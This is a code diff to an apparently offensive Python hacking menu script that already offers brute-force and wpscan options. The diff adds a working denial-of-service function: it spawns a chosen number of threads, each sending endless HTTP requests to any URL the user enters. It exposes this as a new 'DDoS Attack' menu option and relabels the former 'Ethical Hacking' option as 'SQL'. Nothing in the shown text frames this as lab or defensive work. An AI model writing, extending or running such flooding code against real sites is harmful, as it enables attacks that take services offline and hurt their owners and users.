@@ -9,6 +9,7 @@ import random
 import string
 import whois
 import json
+import threading
 
 logging.basicConfig(filename='bruteforce_success.log', level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
@@ -111,13 +112,28 @@ def wpscan(url):
     else:
         print("wpscan completed successfully.")
 
+def ddos_attack(url, threads=100):
+    def attack():
+        while True:
+            try:
+                requests.get(url)
+                print(f"Sent request to {url}")
+            except requests.RequestException as e:
+                print(f"Error: {e}")
+    
+    print(f"Starting DDoS attack on {url} with {threads} threads")
+    for _ in range(threads):
+        thread = threading.Thread(target=attack)
+        thread.start()
+
 def main():
     print("Choose an option:")
     print("1. Brute Force")
     print("2. Web")
-    print("3. Ethical Hacking")
+    print("3. SQL")
+    print("4. DDoS Attack")
 
-    choice = input("Enter your choice (1, 2 or 3): ")
+    choice = input("Enter your choice (1, 2, 3 or 4): ")
 
     if choice == '1':
         domain, username = prompt_for_input()
@@ -161,8 +177,13 @@ def main():
             print("Invalid scan type choice.")
             sys.exit(1)
 
+    elif choice == '4':
+        url = input("Please enter a URL to attack: ")
+        threads = int(input("Enter number of threads: "))
+        ddos_attack(url, threads)
+
     else:
-        print("Invalid choice. Please enter 1, 2 or 3.")
+        print("Invalid choice. Please enter 1, 2, 3 or 4.")
         sys.exit(1)
 
 if __name__ == '__main__':
